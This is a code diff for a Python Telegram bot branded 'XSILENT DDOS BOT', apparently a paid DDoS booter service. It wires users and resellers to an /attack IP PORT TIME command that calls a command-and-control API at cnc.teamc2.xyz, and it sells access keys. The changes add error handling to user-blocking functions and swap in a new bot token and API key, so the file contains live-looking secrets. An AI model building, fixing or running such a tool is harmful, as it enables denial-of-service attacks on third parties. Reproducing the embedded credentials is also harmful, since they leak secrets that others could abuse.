@@ -13,10 +13,10 @@ from collections import defaultdict
 from pymongo import MongoClient
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8291785662:AAE49V61h5jILkH7Fk_rL8haaAgHwLcY6wE"
+BOT_TOKEN = "8291785662:AAF0fsNI138egAmxyidMm3ltePQm9v-LZLc"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
-API_KEY = "WkhgMWL"
+API_KEY = "WTbbRMWL"
 MAX_CONCURRENT = 2
 
 # ========== MONGODB CONNECTION ==========
@@ -107,41 +107,61 @@ def get_group_attack_time(group_id):
         return group.get("attack_time", 60)
     return None
 
-# Blocked users functions
+# Blocked users functions - FIXED
 def load_blocked_users():
     blocked_users = {}
-    for blocked_data in blocked_users_collection.find():
-        blocked_users[blocked_data["user_id"]] = {
-            "blocked_by": blocked_data.get("blocked_by"),
-            "blocked_at": blocked_data.get("blocked_at"),
-            "reason": blocked_data.get("reason", "No reason provided")
-        }
+    try:
+        for blocked_data in blocked_users_collection.find():
+            # Safely get user_id with fallback
+            user_id = blocked_data.get("user_id")
+            if user_id:  # Only add if user_id exists
+                blocked_users[user_id] = {
+                    "blocked_by": blocked_data.get("blocked_by", "Unknown"),
+                    "blocked_at": blocked_data.get("blocked_at", time.time()),
+                    "reason": blocked_data.get("reason", "No reason provided")
+                }
+    except Exception as e:
+        print(f"Error loading blocked users: {e}")
     return blocked_users
 
 def save_blocked_user(user_id, blocked_by, reason="No reason provided"):
-    blocked_users_collection.update_one(
-        {"user_id": user_id},
-        {"$set": {
-            "user_id": user_id,
-            "blocked_by": blocked_by,
-            "blocked_at": time.time(),
-            "reason": reason
-        }},
-        upsert=True
-    )
+    try:
+        blocked_users_collection.update_one(
+            {"user_id": user_id},
+            {"$set": {
+                "user_id": user_id,
+                "blocked_by": blocked_by,
+                "blocked_at": time.time(),
+                "reason": reason
+            }},
+            upsert=True
+        )
+        return True
+    except Exception as e:
+        print(f"Error saving blocked user: {e}")
+        return False
 
 def remove_blocked_user(user_id):
-    blocked_users_collection.delete_one({"user_id": user_id})
+    try:
+        blocked_users_collection.delete_one({"user_id": user_id})
+        return True
+    except Exception as e:
+        print(f"Error removing blocked user: {e}")
+        return False
 
 def is_user_blocked(user_id):
-    return blocked_users_collection.find_one({"user_id": user_id}) is not None
+    try:
+        return blocked_users_collection.find_one({"user_id": user_id}) is not None
+    except Exception as e:
+        print(f"Error checking blocked user: {e}")
+        return False
 
 users_data = load_users()
 users = users_data["users"]
 resellers = users_data.get("resellers", [])
 keys_data = load_keys()
 groups = load_groups()
-blocked_users = load_blocked_users()
+blocked_users = load_blocked_users()  # This will now work even if collection is empty or has bad data
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -280,7 +300,7 @@ def start(msg):
         return
     
     if uid in ADMIN_ID:
-        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n/block USER_ID REASON\n/unblock USER_ID\n/blockedlist")
+        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n/block USER_ID REASON\n/unblock USER_ID\n/blockedlist\n/host COMMAND")
     elif uid in resellers:
         bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
     elif uid in users:
@@ -342,26 +362,27 @@ def block_user(msg):
         bot.reply_to(msg, f"⚠️ User {user_to_block} is already blocked!")
         return
     
-    save_blocked_user(user_to_block, uid, reason)
-    
-    # Remove from users list if present
-    if user_to_block in users:
-        users.remove(user_to_block)
-        users_data["users"] = users
-        save_users(users_data)
-    
-    # Remove from resellers list if present
-    if user_to_block in resellers:
-        resellers.remove(user_to_block)
-        users_data["resellers"] = resellers
-        save_users(users_data)
-    
-    bot.reply_to(msg, f"✅ USER BLOCKED!\n\n👤 User: {user_to_block}\n📝 Reason: {reason}\n\nUser can no longer use the bot!")
-    
-    try:
-        bot.send_message(user_to_block, f"🚫 You have been blocked from using this bot!\n\nReason: {reason}\n\nContact owner for more information.")
-    except:
-        pass
+    if save_blocked_user(user_to_block, uid, reason):
+        # Remove from users list if present
+        if user_to_block in users:
+            users.remove(user_to_block)
+            users_data["users"] = users
+            save_users(users_data)
+        
+        # Remove from resellers list if present
+        if user_to_block in resellers:
+            resellers.remove(user_to_block)
+            users_data["resellers"] = resellers
+            save_users(users_data)
+        
+        bot.reply_to(msg, f"✅ USER BLOCKED!\n\n👤 User: {user_to_block}\n📝 Reason: {reason}\n\nUser can no longer use the bot!")
+        
+        try:
+            bot.send_message(user_to_block, f"🚫 You have been blocked from using this bot!\n\nReason: {reason}\n\nContact owner for more information.")
+        except:
+            pass
+    else:
+        bot.reply_to(msg, "❌ Failed to block user. Please try again.")
 
 # Unblock user command
 @bot.message_handler(commands=['unblock'])
@@ -383,13 +404,15 @@ def unblock_user(msg):
         bot.reply_to(msg, f"⚠️ User {user_to_unblock} is not blocked!")
         return
     
-    remove_blocked_user(user_to_unblock)
-    bot.reply_to(msg, f"✅ USER UNBLOCKED!\n\n👤 User: {user_to_unblock}\n\nUser can now use the bot again!")
-    
-    try:
-        bot.send_message(user_to_unblock, "✅ You have been unblocked! You can now use the bot again.")
-    except:
-        pass
+    if remove_blocked_user(user_to_unblock):
+        bot.reply_to(msg, f"✅ USER UNBLOCKED!\n\n👤 User: {user_to_unblock}\n\nUser can now use the bot again!")
+        
+        try:
+            bot.send_message(user_to_unblock, "✅ You have been unblocked! You can now use the bot again.")
+        except:
+            pass
+    else:
+        bot.reply_to(msg, "❌ Failed to unblock user. Please try again.")
 
 # List blocked users command
 @bot.message_handler(commands=['blockedlist'])
@@ -400,20 +423,26 @@ def blocked_list(msg):
         bot.reply_to(msg, "❌ Owner only!")
         return
     
-    blocked_users_list = list(blocked_users_collection.find())
-    
-    if not blocked_users_list:
-        bot.reply_to(msg, "📋 No blocked users found.")
-        return
-    
-    blocked_msg = "🚫 BLOCKED USERS LIST\n\n"
-    for i, user in enumerate(blocked_users_list, 1):
-        blocked_msg += f"{i}. 👤 User: {user['user_id']}\n"
-        blocked_msg += f"   📝 Reason: {user.get('reason', 'No reason')}\n"
-        blocked_msg += f"   👮 Blocked by: {user.get('blocked_by', 'Unknown')}\n"
-        blocked_msg += f"   📅 Date: {datetime.fromtimestamp(user.get('blocked_at', time.time())).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-    
-    bot.reply_to(msg, blocked_msg)
+    try:
+        blocked_users_list = list(blocked_users_collection.find())
+        
+        if not blocked_users_list:
+            bot.reply_to(msg, "📋 No blocked users found.")
+            return
+        
+        blocked_msg = "🚫 BLOCKED USERS LIST\n\n"
+        for i, user in enumerate(blocked_users_list, 1):
+            user_id = user.get('user_id', 'Unknown')
+            if user_id != 'Unknown':  # Only show valid entries
+                blocked_msg += f"{i}. 👤 User: {user_id}\n"
+                blocked_msg += f"   📝 Reason: {user.get('reason', 'No reason')}\n"
+                blocked_msg += f"   👮 Blocked by: {user.get('blocked_by', 'Unknown')}\n"
+                blocked_at = user.get('blocked_at', time.time())
+                blocked_msg += f"   📅 Date: {datetime.fromtimestamp(blocked_at).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        
+        bot.reply_to(msg, blocked_msg)
+    except Exception as e:
+        bot.reply_to(msg, f"❌ Error loading blocked users: {str(e)}")
 
 @bot.message_handler(commands=['attack'])
 def attack(msg):
@@ -1081,12 +1110,12 @@ def help_cmd(msg):
 /addreseller USER_ID - Add reseller
 /removereseller USER_ID - Remove reseller
 
-👥 BLOCK COMMANDS:
+🚫 BLOCK COMMANDS:
 /block USER_ID REASON - Block user
 /unblock USER_ID - Unblock user
 /blockedlist - List blocked users
 
-👥 HOST COMMAND:
+🛡️ HOST COMMAND:
 /host COMMAND - Block command on bot host
 
 👥 GROUP MANAGEMENT:
@@ -1160,22 +1189,28 @@ def cleanup_attacks():
 @bot.message_handler(func=lambda msg: True)
 def block_host_commands(msg):
     """Block commands that are in the blocked list"""
-    blocked_commands_data = settings_collection.find_one({"_id": "blocked_commands"})
-    if blocked_commands_data:
-        blocked_commands = blocked_commands_data.get("commands", [])
-        for blocked_cmd in blocked_commands:
-            if msg.text and msg.text.startswith(blocked_cmd):
-                bot.reply_to(msg, "🚫 BLOCKED BOT\n\nThis command has been blocked by the host.\nContact bot owner for more information.")
-                return
+    try:
+        blocked_commands_data = settings_collection.find_one({"_id": "blocked_commands"})
+        if blocked_commands_data:
+            blocked_commands = blocked_commands_data.get("commands", [])
+            for blocked_cmd in blocked_commands:
+                if msg.text and msg.text.startswith(blocked_cmd):
+                    bot.reply_to(msg, "🚫 BLOCKED BOT\n\nThis command has been blocked by the host.\nContact bot owner for more information.")
+                    return
+    except Exception as e:
+        print(f"Error checking blocked commands: {e}")
 
 cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
 cleanup_thread.start()
 
-print("XSILENT BOT STARTED - Owner: 8487946379")
+print("=" * 50)
+print("XSILENT BOT STARTED SUCCESSFULLY!")
+print(f"Owner ID: {ADMIN_ID[0]}")
 print("Features:")
 print("✅ Host command blocking feature enabled")
 print("✅ User blocking feature enabled")
 print("✅ Fixed key redemption issue")
 print("✅ Block user command added (/block, /unblock, /blockedlist)")
+print("=" * 50)
 
 bot.infinity_polling()
